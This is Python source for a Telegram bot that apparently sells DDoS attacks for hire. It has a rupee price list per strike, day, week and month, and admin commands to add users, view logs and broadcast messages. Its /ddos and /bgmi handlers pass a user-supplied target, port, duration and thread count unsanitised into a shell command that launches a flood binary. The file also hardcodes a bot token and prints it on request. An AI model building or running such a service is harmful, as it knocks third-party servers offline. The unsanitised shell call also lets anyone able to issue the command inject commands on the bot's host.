
import telebot
import subprocess
import requests
import datetime
import os
import logging

# insert your Telegram bot token here
TOKEN = '7018282415:AAGCpqMdkoZsg6KCTWdAwH4tYjTO_6fVbb4'
bot = telebot.TeleBot(TOKEN)

# Admin user IDs
admin_id = ["-1002178243149", "6397654988"]

# File to store allowed user IDs
USER_FILE = "users.txt"

FREE_USER_FILE = "f.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass


# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time, threads):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\nThreads: {threads}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found..."
            else:
                file.truncate(0)
                response = "Logs cleared successfully..."
    except FileNotFoundError:
        response = "No logs found to clear..."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None, threads=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    if threads:
        log_entry += f" | Threads: {threads}"

    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id == proxy_server or user_id == antiban or user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"𝙐𝙨𝙚𝙧 {user_to_add} 𝘼𝙙𝙙𝙚𝙙 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮..."
            else:
                response = "𝙐𝙨𝙚𝙧 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙚𝙭𝙞𝙨𝙩𝙨..."
        else:
            response = "𝙋𝙡𝙚𝙖𝙨𝙚 𝙨𝙥𝙚𝙘𝙞𝙛𝙮 𝙖 𝙪𝙨𝙚𝙧 𝙄𝘿 𝙩𝙤 𝙖𝙙𝙙..."
    else:
        response = "𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙍𝙪𝙣 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙..."

    bot.reply_to(message, response)



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id == proxy_server or user_id == antiban or user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"𝙐𝙨𝙚𝙧 {user_to_remove} 𝙧𝙚𝙢𝙤𝙫𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮..."
            else:
                response = f"𝙐𝙨𝙚𝙧 {user_to_remove} 𝙣𝙤𝙩 𝙛𝙤𝙪𝙣𝙙 𝙞𝙣 𝙩𝙝𝙚 𝙡𝙞𝙨𝙩..."
        else:
            response = '''𝗣𝗹𝗲𝗮𝘀𝗲 𝗦𝗽𝗲𝗰𝗶𝗳𝘆 𝗔 𝗨𝘀𝗲𝗿 𝗜𝗗 𝘁𝗼 𝗥𝗲𝗺𝗼𝘃𝗲. 
  Usage: /remove <userid>'''
    else:
        response = "𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙍𝙪𝙣 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙..."

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id == proxy_server or user_id == antiban or user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "𝙇𝙤𝙜𝙨 𝙖𝙧𝙚 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙘𝙡𝙚𝙖𝙧𝙚𝙙. 𝙉𝙤 𝙙𝙖𝙩𝙖 𝙛𝙤𝙪𝙣𝙙..."
                else:
                    file.truncate(0)
                    response = "𝙇𝙤𝙜𝙨 𝘾𝙡𝙚𝙖𝙧𝙚𝙙 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮..."
        except FileNotFoundError:
            response = "𝙇𝙤𝙜𝙨 𝙖𝙧𝙚 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙘𝙡𝙚𝙖𝙧𝙚𝙙..."
    else:
        response = "𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙍𝙪𝙣 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙..."
    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id == proxy_server or user_id == antiban or user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "𝗔𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗨𝘀𝗲𝗿𝘀:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "𝙉𝙤 𝙙𝙖𝙩𝙖 𝙛𝙤𝙪𝙣𝙙"
        except FileNotFoundError:
            response = "𝙉𝙤 𝙙𝙖𝙩𝙖 𝙛𝙤𝙪𝙣𝙙"
    else:
        response = "𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙍𝙪𝙣 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙..."
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id == proxy_server or user_id == antiban or user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "𝙉𝙤 𝙙𝙖𝙩𝙖 𝙛𝙤𝙪𝙣𝙙..."
                bot.reply_to(message, response)
        else:
            response = "𝙉𝙤 𝙙𝙖𝙩𝙖 𝙛𝙤𝙪𝙣𝙙..."
            bot.reply_to(message, response)
    else:
        response = "𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙍𝙪𝙣 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙..."
        bot.reply_to(message, response)

atckmedia = "https://telegra.ph/file/ea8c0450f308aff8da539.jpg"

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"𝐘𝐨𝐮𝐫 𝐈𝐃:: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /ddos command
def start_attack_reply(message, target, port, time, threads):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 𝐒𝐭𝐫𝐢𝐤𝐞 𝐋𝐚𝐮𝐧𝐜𝐡𝐞𝐝...\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐓𝐡𝐫𝐞𝐚𝐝𝐬: {threads}\n𝐓𝐲𝐩𝐞: DDOS"
    bot.send_photo(message.chat.id, atckmedia, caption=response)  # Send the media with the caption
    # bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /ddos command
ddos_cooldown = {}

COOLDOWN_TIME =0
proxy_server = "-1002178243149"

# Handler for /ddos command
@bot.message_handler(commands=['ddos', 'bgmi'])
def handle_ddos(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in ddos_cooldown and (datetime.datetime.now() - ddos_cooldown[user_id]).seconds < 0:
                response = "𝙔𝙤𝙪 𝘼𝙧𝙚 𝙊𝙣 𝘾𝙤𝙤𝙡𝙙𝙤𝙬𝙣... 𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 10𝙨𝙚𝙘 𝘽𝙚𝙛𝙤𝙧𝙚 𝙍𝙪𝙣𝙣𝙞𝙣𝙜 𝙏𝙝𝙚 /𝙙𝙙𝙤𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 𝘼𝙜𝙖𝙞𝙣."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            ddos_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 5:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            threads = int(command[4])  # Convert threads to integer
            if time > 241:
                response = "𝗘𝗿𝗿𝗼𝗿: 𝗧𝗶𝗺𝗲 𝗶𝗻𝘁𝗲𝗿𝘃𝗮𝗹 𝗺𝘂𝘀𝘁 𝗯𝗲 𝗹𝗲𝘀𝘀 𝘁𝗵𝗮𝗻 𝟮𝟰𝟭."
            else:
                record_command_logs(user_id, '/ddos', target, port, time, threads)
                log_command(user_id, target, port, time, threads)
                start_attack_reply(message, target, port, time, threads)  # Call start_attack_reply function
                full_command = f"./ddos {target} {port} {time} {threads}"
                subprocess.run(full_command, shell=True)
                response = f"𝐒𝐭𝐫𝐢𝐤𝐞 𝐅𝐢𝐧𝐢𝐬𝐡𝐞𝐝. \n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target} \n𝐏𝐨𝐫𝐭: {port} \n𝐓𝐢𝐦𝐞: {time}\n𝐓𝐡𝐫𝐞𝐚𝐝𝐬: {threads}"
        else:
            response = " Usage :- /ddos <target> <port> <time> <threads>"  # Updated command syntax
    else:
        response = "𝙔𝙤𝙪 𝘼𝙧𝙚 𝙉𝙤𝙩 𝘼𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙. 𝘾𝙤𝙣𝙩𝙖𝙘𝙩 𝘼𝙙𝙢𝙞𝙣."

    bot.reply_to(message, response)



# Add /mylogs command to display logs recorded for ddos and website commands
antiban = "-1002177030613"
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "𝗬𝗼𝘂𝗿 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗛𝗶𝘀𝘁𝗼𝗿𝘆:\n" + "".join(user_logs)
                else:
                    response = "𝙔𝙤𝙪 𝘿𝙤𝙣'𝙩 𝙃𝙖𝙫𝙚 𝘼𝙣𝙮 𝙃𝙞𝙨𝙩𝙤𝙧𝙮..."
        except FileNotFoundError:
            response = "𝙔𝙤𝙪 𝘿𝙤𝙣'𝙩 𝙃𝙖𝙫𝙚 𝘼𝙣𝙮 𝙃𝙞𝙨𝙩𝙤𝙧𝙮..."
    else:
        response = "𝙔𝙤𝙪 𝘼𝙧𝙚 𝙉𝙤𝙩 𝘼𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙. 𝘾𝙤𝙣𝙩𝙖𝙘𝙩 𝘼𝙙𝙢𝙞𝙣."

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''
/ddos :  𝐅𝐨𝐫 𝐒𝐭𝐫𝐢𝐤𝐞 𝐒𝐞𝐫𝐯𝐞𝐫𝐬.
/rules : 𝐏𝐥𝐞𝐚𝐬𝐞 𝐂𝐡𝐞𝐜𝐤 𝐁𝐞𝐟𝐨𝐫𝐞 𝐔𝐬𝐞 !!.
/mylogs : 𝐓𝐨 𝐂𝐡𝐞𝐜𝐤 𝐘𝐨𝐮𝐫 𝐑𝐞𝐜𝐞𝐧𝐭𝐬 𝐇𝐢𝐬𝐭𝐨𝐫𝐲.
/plan : 𝐂𝐡𝐞𝐜𝐤𝐨𝐮𝐭 𝐎𝐮𝐫 𝐁𝐨𝐭𝐧𝐞𝐭 𝐑𝐚𝐭𝐞𝐬.
/admincmd : 𝐒𝐡𝐨𝐰𝐬 𝐀𝐥𝐥 𝐀𝐝𝐦𝐢𝐧 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬.

'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''𝗪𝗲𝗹𝗰𝗼𝗺𝗲 , {user_name} 
𝗙𝗲𝗲𝗹 𝗙𝗿𝗲𝗲 𝘁𝗼 𝗘𝘅𝗽𝗹𝗼𝗿𝗲... '''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}
𝗣𝗹𝗲𝗮𝘀𝗲 𝗳𝗼𝗹𝗹𝗼𝘄 𝘁𝗵𝗲𝘀𝗲 𝗿𝘂𝗹𝗲𝘀 ⚠️:

1. 𝐃𝐨 𝐧𝐨𝐭 𝐫𝐮𝐧 𝐭𝐨𝐨 𝐦𝐚𝐧𝐲 𝐬𝐭𝐫𝐢𝐤𝐞𝐬, 𝐚𝐬 𝐭𝐡𝐢𝐬 𝐜𝐚𝐧 𝐜𝐚𝐮𝐬𝐞 𝐚 𝐛𝐚𝐧.

2. 𝐃𝐨 𝐧𝐨𝐭 𝐫𝐮𝐧 𝐭𝐰𝐨 𝐬𝐭𝐫𝐢𝐤𝐞𝐬 𝐚𝐭 𝐭𝐡𝐞 𝐬𝐚𝐦𝐞 𝐭𝐢𝐦𝐞, 𝐛𝐞𝐜𝐚𝐮𝐬𝐞 𝐢𝐟 𝐲𝐨𝐮 𝐝𝐨, 𝐲𝐨𝐮 𝐰𝐢𝐥𝐥 𝐠𝐞𝐭 𝐛𝐚𝐧𝐧𝐞𝐝 𝐟𝐫𝐨𝐦 𝐭𝐡𝐞 𝐛𝐨𝐭.

3. 𝐖𝐞 𝐜𝐡𝐞𝐜𝐤 𝐭𝐡𝐞 𝐥𝐨𝐠𝐬 𝐝𝐚𝐢𝐥𝐲, 𝐬𝐨 𝐟𝐨𝐥𝐥𝐨𝐰 𝐭𝐡𝐞𝐬𝐞 𝐫𝐮𝐥𝐞𝐬 𝐭𝐨 𝐚𝐯𝐨𝐢𝐝 𝐚 𝐛𝐚𝐧.

4. 𝐓𝐡𝐢𝐬 𝐛𝐨𝐭 𝐢𝐬 𝐢𝐧𝐭𝐞𝐧𝐝𝐞𝐝 𝐟𝐨𝐫 𝐞𝐝𝐮𝐜𝐚𝐭𝐢𝐨𝐧𝐚𝐥 𝐮𝐬𝐞 𝐨𝐧𝐥𝐲.

5. 𝑹𝒆𝒎𝒆𝒎𝒃𝒆𝒓 𝒕𝒐 𝒖𝒔𝒆 𝒕𝒉𝒊𝒔 𝒕𝒐𝒐𝒍 𝒓𝒆𝒔𝒑𝒐𝒏𝒔𝒊𝒃𝒍𝒚 𝒂𝒏𝒅 𝒘𝒊𝒕𝒉𝒊𝒏 𝒍𝒆𝒈𝒂𝒍 𝒃𝒐𝒖𝒏𝒅𝒂𝒓𝒊𝒆𝒔. 𝑴𝒊𝒔𝒖𝒔𝒆 𝒄𝒂𝒏 𝒉𝒂𝒗𝒆 𝒔𝒆𝒓𝒊𝒐𝒖𝒔 𝒄𝒐𝒏𝒔𝒆𝒒𝒖𝒆𝒏𝒄𝒆𝒔.
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 
𝐏𝐫𝐢𝐜𝐞 𝐋𝐢𝐬𝐭 📃:

-> 𝐏𝐞𝐫 𝐒𝐭𝐫𝐢𝐤𝐞𝐬: 𝟏𝟎 𝐑𝐬
-> 𝐃𝐚𝐲: 𝟏𝟎𝟎 𝐑𝐬
-> 𝐖𝐞𝐞𝐤: 𝟐𝟓𝟎 𝐑𝐬
-> 𝐌𝐨𝐧𝐭𝐡: 𝟕𝟎𝟎 𝐑𝐬

𝑷𝒍𝒆𝒂𝒔𝒆 𝒆𝒏𝒔𝒖𝒓𝒆 𝒚𝒐𝒖 𝒇𝒐𝒍𝒍𝒐𝒘 𝒕𝒉𝒆 𝒓𝒖𝒍𝒆𝒔 𝒕𝒐 𝒂𝒗𝒐𝒊𝒅 𝒂 𝒃𝒂𝒏. 𝑼𝒔𝒆 𝒕𝒉𝒊𝒔 𝒕𝒐𝒐𝒍 𝒓𝒆𝒔𝒑𝒐𝒏𝒔𝒊𝒃𝒍𝒚 𝒂𝒏𝒅 𝒘𝒊𝒕𝒉𝒊𝒏 𝒍𝒆𝒈𝒂𝒍 𝒃𝒐𝒖𝒏𝒅𝒂𝒓𝒊𝒆𝒔. 𝑴𝒊𝒔𝒖𝒔𝒆 𝒄𝒂𝒏 𝒉𝒂𝒗𝒆 𝒔𝒆𝒓𝒊𝒐𝒖𝒔 𝒄𝒐𝒏𝒔𝒆𝒒𝒖𝒆𝒏𝒄𝒆𝒔.
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 
    𝗔𝗱𝗺𝗶𝗻 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀 𝗔𝗿𝗲 𝗛𝗲𝗿𝗲!:

 /add <userId> : 𝗔𝗱𝗱 𝗮 𝗨𝘀𝗲𝗿.
 /remove <userid> 𝗥𝗲𝗺𝗼𝘃𝗲 𝗮 𝗨𝘀𝗲𝗿.
 /allusers : 𝗔𝘂𝘁𝗵𝗼𝗿𝗶𝘀𝗲𝗱 𝗨𝘀𝗲𝗿𝘀 𝗟𝗶𝘀𝘁𝘀.
 /logs : 𝗔𝗹𝗹 𝗨𝘀𝗲𝗿𝘀 𝗟𝗼𝗴𝘀.
 /broadcast : 𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 𝗮 𝗠𝗲𝘀𝘀𝗮𝗴𝗲.
 /clearlogs : 𝗖𝗹𝗲𝗮𝗿 𝗧𝗵𝗲 𝗟𝗼𝗴𝘀 𝗙𝗶𝗹𝗲.
'''
    bot.reply_to(message, response)


def alive_message_on_startup():
    media_url = "https://telegra.ph/file/eca4bbd0cae5d587d91d5.jpg"
    message_to_alive = "𝑯𝒆𝒚, 𝑰 𝒂𝒎 𝒂𝒍𝒊𝒗𝒆. \n               𝑳𝒆𝒕'𝒔 𝒑𝒍𝒂𝒚 𝒂 𝒈𝒂𝒎𝒆!"
    try:
        with open(USER_FILE, "r") as file:
            user_ids = file.read().splitlines()
            for user_id in user_ids:
                try:
                    bot.send_photo(user_id, media_url, caption=message_to_alive)
                    logging.info(f"Message sent to user {user_id}")
                except Exception as e:
                    logging.error(f"Failed to send alive message to user {user_id}: {str(e)}")
    except FileNotFoundError:
        logging.error(f"User file {USER_FILE} not found.")
    except Exception as e:
        logging.error(f"An error occurred: {str(e)}")

if __name__ == "__main__":
    print("Script running...")  
    logging.info("Starting bot and aliveing message on startup.")
    alive_message_on_startup()

@bot.message_handler(commands=['whoareyou'])
def welcome_who(message):
    user_name = message.from_user.first_name
    bot.reply_to(message, f"I am a bot: `{TOKEN}`")

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id == proxy_server or user_id == antiban or user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "👨‍💻 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 𝗙𝗿𝗼𝗺 𝗔𝗱𝗺𝗶𝗻:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙎𝙚𝙣𝙩 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙏𝙤 𝘼𝙡𝙡 𝙐𝙨𝙚𝙧𝙨."
        else:
            response = "𝙋𝙡𝙚𝙖𝙨𝙚 𝙋𝙧𝙤𝙫𝙞𝙙𝙚 𝘼 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙏𝙤 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩."
    else:
        response = "𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙍𝙪𝙣 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙..."

    bot.reply_to(message, response)




bot.polling()
